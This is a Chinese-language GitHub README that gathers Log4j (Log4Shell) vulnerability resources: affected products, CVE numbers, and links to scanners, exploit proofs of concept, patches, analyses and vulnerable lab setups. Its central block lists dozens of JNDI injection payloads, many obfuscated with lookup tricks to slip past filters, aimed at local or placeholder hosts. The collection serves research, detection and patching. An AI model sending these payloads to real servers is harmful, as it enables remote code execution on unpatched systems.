# HackLog4j-永恒之恶龙

本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2022年1月11日。

- [00-Log4j永恒恶龙](https://github.com/0e0w/HackLog4j#00-log4j%E6%B0%B8%E6%81%92%E6%81%B6%E9%BE%99)
- [01-Log4j基础知识](https://github.com/0e0w/HackLog4j#01-log4j%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)
- [02-Log4j框架识别](https://github.com/0e0w/HackLog4j#02-log4j%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB)
- [03-Log4j上层建筑](https://github.com/0e0w/HackLog4j#03-log4j%E4%B8%8A%E5%B1%82%E5%BB%BA%E7%AD%91)
- [04-Log4j漏洞汇总](https://github.com/0e0w/HackLog4j#04-log4j%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB)
- [05-Log4j检测利用](https://github.com/0e0w/HackLog4j#05-log4j%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8)
- [06-Log4j漏洞修复](https://github.com/0e0w/HackLog4j#06-log4j%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D)
- [07-Log4j分析文章](https://github.com/0e0w/HackLog4j#07-log4j%E5%88%86%E6%9E%90%E6%96%87%E7%AB%A0)
- [08-Log4j靶场环境](https://github.com/0e0w/HackLog4j#08-log4j%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

## 00-Log4j永恒恶龙

- https://github.com/Goqi/ELong 

## 01-Log4j基础知识

- https://github.com/apache/logging-log4j2

## 02-Log4j框架识别

- 待更新

## 03-Log4j上层建筑

**log4j + ？ = rce ！**

- [x] Apache Flink
- [x] Apache Struts2
- [ ] Apache Spark
- [x] Apache Storm
- [ ] Apache Tomcat
- [x] Apache Solr
- [ ] Apache Dubbo
- [ ] Apache Druid
- [x] Apache OFBiz
- [ ] Apache Flume
- [ ] Redis
- [ ] Logstash
- [ ] ElasticSearch
- [ ] Apache Kafka
- [ ] Ghidra
- [ ] Spring-Boot-strater-log4j2
- [ ] VMware vCenter
- [ ] Minecraft
- ......
- https://fofa.so/static_pages/log4j2
- https://github.com/cisagov/log4j-affected-db
- https://github.com/YfryTchsGD/Log4jAttackSurface
- https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
- https://github.com/CrackerCat/Log4jAttackSurface
- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages
- https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html
- https://github.com/authomize/log4j-log4shell-affected
- https://github.com/NS-Sp4ce/Vm4J

## 04-Log4j漏洞汇总

- CVE-2021-45105
- CVE-2021-44228
- CVE-2021-4104
- CVE-2019-17571
- CVE-2017-5645

## 05-Log4j检测利用

如何判断一个网站是否存在Log4j JNDI注入漏洞？如何查找内网中存在Log4j JNDI注入漏洞？

一、Payload

```
${jndi:ldap://127.0.0.1/poc}
${jndi:rmi://127.0.0.1/poc}
${jndi:dns://127.0.0.1/poc}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}
${${::-j}ndi:rmi://127.0.0.1/poc}
${${lower:jndi}:${lower:rmi}://127.0.0.1/poc}
${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://127.0.0.1/poc}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}}://127.0.0.1/poc}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/poc}
$%7Bjndi:ldap://127.0.0.1/poc%7D
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}127.0.0.1/poc}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/poc}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/poc}
${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}127.0.0.1/poc}
${jndi:${lower:l}${lower:d}ap://127.0.0.1/poc}
${jndi:ldap://127.0.0.1#127.0.0.1/poc}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://k123.k123.k123/poc}
${${::-j}ndi:rmi://k123.k123.k123/ass}
${jndi:rmi://k8.k123.k123}
${${lower:jndi}:${lower:rmi}://k8.k123.k123/poc}
${${lower:${lower:jndi}}:${lower:rmi}://k8.k123.k123/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://k8.k123.k123/poc}
j${loWer:Nd}i${uPper::}
${jndi:ldaps://127.0.0.1/poc}
${jndi:iiop://127.0.0.1/poc}
${date:ldap://127.0.0.1/poc}
${java:ldap://127.0.0.1/poc}
${marker:ldap://127.0.0.1/poc}
${ctx:ldap://127.0.0.1/poc}
${lower:ldap://127.0.0.1/poc}
${upper:ldap://127.0.0.1/poc}
${main:ldap://127.0.0.1/poc}
${jvmrunargs:ldap://127.0.0.1/poc}
${sys:ldap://127.0.0.1/poc}
${env:ldap://127.0.0.1/poc}
${log4j:ldap://127.0.0.1/poc}
${j${k8s:k5:-ND}i${sd:k5:-:}${lower:l}d${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}
${jndi:rmi://127.0.0.1}/
${jnd${123%25ff:-${123%25ff:-i:}}ldap://127.0.0.1/poc}
${jndi:dns://127.0.0.1}
${j${k8s:k5:-ND}i:ldap://127.0.0.1/poc}
${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//127.0.0.1/poc}
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://127.0.0.1/poc}
${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//127.0.0.1/poc}
${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://127.0.0.1/poc}
${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//127.0.0.1/poc}
${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//127.0.0.1/poc}
${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//127.0.0.1/poc
${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//127.0.0.1/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1}
${jnd${upper:i}:ldap://127.0.0.1/poc}
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://127.0.0.1/poc}
${jndi:ldap://127.0.0.1#127.0.0.1:1389/poc}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/poc}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}
${${lower:jndi}:${lower:ldap}://127.0.0.1/poc}
${${::-j}ndi:rmi://127.0.0.1/poc}
${${lower:${lower:jndi}}:${lower:ldap}://127.0.0.1/poc}
${${lower:jndi}:${lower:rmi}://127.0.0.1/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://127.0.0.1/poc}
${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}p://127.0.0.1/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://127.0.0.1/poc}
${j${env:DOESNOTEXIST:-}ndi:ldap://127.0.0.1/poc}
${j${env:DOESNOTEXIST:-}ndi:rmi://127.0.0.1/poc}
${${: : : : ::: :: :: : :::-j}ndi:ldap://127.0.0.1/poc}
${${: : : : ::: :: :: : :::-j}ndi:rmi://127.0.0.1/poc}
${${::::::::::::::-j}ndi:ldap://127.0.0.1/poc}
${${::::::::::::::-j}ndi:rmi://127.0.0.1/poc}
```

- https://github.com/test502git/log4j-fuzz-head-poc
- https://github.com/woodpecker-appstore/log4j-payload-generator
- https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words

二、源码检测

- https://github.com/google/log4jscanner
- https://github.com/hupe1980/scan4log4shell
- https://github.com/logpresso/CVE-2021-44228-Scanner
- https://github.com/xsultan/log4jshield
- https://github.com/Joefreedy/Log4j-Windows-Scanner
- https://github.com/back2root/log4shell-rex
- https://github.com/Neo23x0/log4shell-detector
- https://github.com/dwisiswant0/look4jar
- https://github.com/Qualys/log4jscanwin
- https://github.com/lijiejie/log4j2_vul_local_scanner
- https://github.com/palantir/log4j-sniffer
- https://github.com/mergebase/log4j-detector
- https://www.t00ls.cc/thread-63931-1-1.html
- https://github.com/darkarnium/Log4j-CVE-Detect
- https://github.com/whitesource/log4j-detect-distribution
- https://github.com/fox-it/log4j-finder

三、出网检测

- https://github.com/dorkerdevil/Log-4-JAM
- https://github.com/adilsoybali/Log4j-RCE-Scanner
- https://github.com/cisagov/log4j-scanner

四、不出网检测

- https://github.com/For-ACGN/Log4Shell
- https://github.com/proferosec/log4jScanner
- https://github.com/Y0-kan/Log4jShell-Scan
- https://github.com/j5s/Log4j2Scan
- https://github.com/EmYiQing/JNDIScan

五、主动扫描

- https://github.com/ilsubyeega/log4j2-exploits
- https://github.com/Cyronlee/log4j-rce

六、被动扫描

- https://github.com/silentsignal/burp-log4shell
- https://github.com/pmiaowu/log4jScan
- https://github.com/guguyu1/log4j2_burp_scan
- https://github.com/whwlsfb/Log4j2Scan
- https://github.com/bigsizeme/Log4j-check
- https://github.com/f0ng/log4j2burpscanner
- https://github.com/pmiaowu/log4j2Scan
- https://github.com/bit4woo/log4jScan
- https://github.com/izj007/Log4j2Scan
- https://github.com/gh0stkey/Log4j2-RCE-Scanner
- https://github.com/p1n93r/Log4j2Scan
- https://github.com/mostwantedduck/BurpLog4j2Scan
- https://github.com/j3ers3/Log4Scan

七、Header检测

- https://github.com/fullhunt/log4j-scan
- https://github.com/0xInfection/LogMePwn
- https://github.com/TaroballzChen/CVE-2021-44228-log4jVulnScanner-metasploit

八、请求参数检测

九、其他工具

- https://github.com/dbgee/log4j2_rce
- https://github.com/ReadER-L/log4j-rce
- https://github.com/HyCraftHD/Log4J-RCE-Proof-Of-Concept
- https://github.com/Seayon/Log4j2RCE_Demo
- https://github.com/elbosso/Log4J2CustomJMXAppender
- https://github.com/ahus1/logging-and-tracing
- https://github.com/stuartwdouglas/log4j-jndi-agent
- https://github.com/xiajun325/apache-log4j-rce-poc
- https://github.com/caoli5288/log4j2jndiinterceptor
- https://github.com/y35uishere/Log4j2-CVE-2021-44228
- https://github.com/ErdbeerbaerLP/log4jfix
- https://github.com/0x0021h/apache-log4j-rce
- https://github.com/Gav06/RceFix
- https://github.com/UltraVanilla/LogJackFix
- https://github.com/iamsino/log4j2-Exp
- https://github.com/bkfish/Apache-Log4j-Learning
- https://github.com/LoliKingdom/NukeJndiLookupFromLog4j
- https://github.com/tangxiaofeng7/apache-log4j-poc
- https://github.com/h1b1ki/apache-log4j-poc
- https://github.com/EmptyIrony/Log4j2Fixer
- https://github.com/AzisabaNetwork/Log4j2Fix
- https://github.com/apple502j/Log4Jail
- https://github.com/jacobtread/L4J-Vuln-Patch
- https://github.com/stardust1900/log4j-2.15.0
- https://github.com/nest-x/nestx-log4js
- https://github.com/Marcelektro/Log4J-RCE-Implementation
- https://github.com/jdremillard/json-logging
- https://github.com/parayaluyanta/sell-logs-and-peace
- https://github.com/albar965/atools
- https://github.com/Al0sc/Log4j-rce
- https://github.com/ven0n1/Log4jv2Maven
- https://github.com/akunzai/log4j2-sendgrid-appender
- https://github.com/inbug-team/Log4j_RCE_Tool
- https://github.com/zlepper/CVE-2021-44228-Test-Server
- https://github.com/webraybtl/Log4j
- https://github.com/numanturle/Log4jNuclei
- https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
- https://github.com/kozmer/log4j-shell-poc
- https://github.com/hackerhackrat/Log4j2-RCE-burp-plugin
- https://github.com/mzlogin/CVE-2021-44228-Demo
- https://github.com/greymd/CVE-2021-44228
- https://github.com/Cybereason/Logout4Shell
- https://github.com/webraybtl/log4j-snort
- https://github.com/corretto/hotpatch-for-apache-log4j2
- https://github.com/alexandre-lavoie/python-log4rce
- https://github.com/hillu/local-log4j-vuln-scanner
- https://github.com/leonjza/log4jpwn
- https://github.com/cyberstruggle/L4sh
- https://github.com/cckuailong/log4shell_1.x
- https://github.com/zhzyker/logmap
- https://github.com/LoRexxar/log_dependency_checklist
- https://github.com/0xDexter0us/Log4J-Scanner
- https://github.com/cckuailong/Log4j_CVE-2021-45046
- https://github.com/KpLi0rn/Log4j2Scan
- https://github.com/righel/log4shell_nse
- https://github.com/Ch0pin/log4JFrida
- https://github.com/mycve/HTTPHeaderInjectBrowser
- https://github.com/ihebski/log4j-Scanner
- https://github.com/Yihsiwei/Log4j-exp
- https://github.com/rz7d/log4j-force-upgrader
- https://github.com/xsser/log4jdemoforRCE
- https://github.com/e5g/Log-4J-Exploit-Fix
- https://github.com/Re1own/Apache-log4j-POC
- https://github.com/jas502n/Log4j2-CVE-2021-44228
- https://github.com/ChloePrime/fix4log4j
- https://github.com/toString122/log4j2_exp
- https://github.com/shanfenglan/apache_log4j_poc
- https://github.com/dbgee/CVE-2021-44228
- https://github.com/lcosmos/apache-log4j-poc
- https://github.com/dbgee/CVE-2021-44228
- https://github.com/lcosmos/apache-log4j-poc
- https://github.com/aalex954/Log4PowerShell
- https://github.com/fox-it/log4shell-pcaps

## 06-Log4j漏洞修复

- https://github.com/360-CERT/Log4ShellPatch
- https://github.com/javasec/log4j-patch
- https://github.com/simonis/Log4jPatch
- https://github.com/FrankHeijden/Log4jFix
- https://github.com/Szczurowsky/Log4j-0Day-Fix
- https://github.com/SumoLogic/sumologic-log4j2-appender
- https://github.com/chaitin/log4j2-vaccine
- https://github.com/zhangyoufu/log4j2-without-jndi
- https://github.com/CreeperHost/Log4jPatcher
- https://github.com/boundaryx/cloudrasp-log4j2
- https://github.com/DichuuCraft/LOG4J2-3201-fix
- https://github.com/DichuuCraft/LOG4J2-3201-fix

## 07-Log4j分析文章

- https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ
- https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ
- https://mp.weixin.qq.com/s/nOmQFq4KxM9AZ_HYIq1_CQ
- https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg
- https://mp.weixin.qq.com/s/AWhV-QdkQ6i2IEZSVhe-Kg
- https://mp.weixin.qq.com/s/iHqwL6jslyCV_0jtdVj82A
- https://lorexxar.cn/2021/12/10/log4j2-jndi
- https://www.t00ls.cc/thread-63705-1-1.html
- https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg

## 08-Log4j靶场环境

- https://hub.docker.com/u/vulfocus
- https://github.com/jweny/log4j-web-env
- https://github.com/fengxuangit/log4j_vuln
- https://www.t00ls.cc/thread-63695-1-1.html
- https://github.com/christophetd/log4shell-vulnerable-app
- https://github.com/Adikso/minecraft-log4j-honeypot
- https://github.com/try777-try777/reVul-apache-log4j2-rec
- https://github.com/EmYiQing/Log4j2DoS
- https://github.com/tothi/log4shell-vulnerable-app
- https://github.com/Anonymous-ghost/log4jVul
- https://github.com/cyberxml/log4j-poc

![](TEMP/wx.png)

[![Stargazers over time](https://starchart.cc//0e0w/HackLog4j.svg)](https://starchart.cc/0e0w/HackLog4j)